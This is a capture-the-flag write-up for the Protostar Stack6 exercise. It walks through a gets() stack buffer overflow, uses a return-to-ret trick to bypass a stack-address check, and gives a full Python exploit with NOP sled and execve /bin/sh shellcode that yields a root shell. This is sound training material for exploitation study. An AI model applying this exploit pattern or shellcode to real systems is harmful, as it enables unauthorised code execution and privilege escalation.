# PROTOSTAR : STACK 6
[Protostar:Stack6](https://exploit.education/protostar/stack-six/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

The **main()** calls **getpath()** function and the **buffer** variable is located in **getpath()**. The **gets** is vulnerable to Buffer Overflow and it takes **buffer** input. After filling the **buffer** we cannot directly go to stack address because of **stack address restrictions**.

### **SOLUTION**
Below is the disassembly of the **getpath()** function.
```
user@protostar:/tmp$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) set disassembly-flavor intel
(gdb) disass getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave  
0x080484f9 <getpath+117>:       ret    
End of assembler dump.
(gdb) 
```

*How to Bypass Stack Address Restriction*
- To bypass the **stack address restriction** we will return to   the function itself, then go to a stack address and place our shellcode there.

    Return address = **0x080484f9** 

```py
import struct
padding = "A"*80

ret = struct.pack("I",0x080484f9)

print(padding + ret)
```
Lets run it and check whether the program returns to the function itself.

```
(gdb) b *0x080484f9
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) r < ./exploit
Starting program: /opt/protostar/bin/stack6 < ./exploit
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) x/4x $esp
0xbffff7ac:     0x080484f9      0x08048500      0x00000000      0xbffff838
(gdb) si

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      in stack6/stack6.c
(gdb) 
```
If you observer the stack you will see the address of the function itself is on the stack and when it got popped the function pointer returned to itself.

Now let's write our Python Exploit code.

```py
import struct
padding = "A"*80

ret = struct.pack("I",0x080484f9)

stack = struct.pack("I",0xbffff7b0+20)

nop = "\x90"*100

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print(padding + ret + stack + nop + shellcode)
```

Executing the program, we get the ROOT SHELL. Remember that the shell needs an input so I have used the **cat** command.
```
user@protostar:/tmp$ (python exploit.py; cat) | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA���������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

whoami
root

```
